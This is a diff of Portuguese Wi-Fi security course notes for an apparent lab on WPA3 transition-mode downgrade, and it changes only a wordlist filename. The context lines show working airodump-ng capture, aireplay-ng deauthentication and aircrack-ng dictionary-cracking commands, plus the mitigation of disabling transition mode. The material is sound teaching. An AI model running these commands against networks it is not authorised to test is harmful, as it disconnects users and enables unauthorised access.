@@ -194,7 +194,7 @@ airodump-ng wlan0mon
 # A partir daqui, o fluxo é IDÊNTICO ao da Aula 08 (captura de handshake WPA2 + dicionário)
 airodump-ng -c <CANAL> --bssid <BSSID_DO_AP> -w downgradewpa3 wlan0mon
 aireplay-ng -0 5 -a <BSSID_DO_AP> -c <MAC_DO_CLIENTE_STATION> wlan0mon
-aircrack-ng -b <BSSID_DO_AP> -w wordlist-laboratorio-expandida.txt downgradewpa3-01.cap
+aircrack-ng -b <BSSID_DO_AP> -w 02-wordlist-lab-expandida.txt downgradewpa3-01.cap
 ```
 
 > ⚠️ **Ponto-chave:** o ataque **não quebrou o WPA3** — ele explorou o fato de o AP **ainda aceitar WPA2** no mesmo SSID. A mitigação é simples e deve ser destacada aos alunos: **desativar o modo de transição** e operar em **WPA3-Personal puro** (Cenário A) sempre que todos os clientes da rede suportarem SAE.
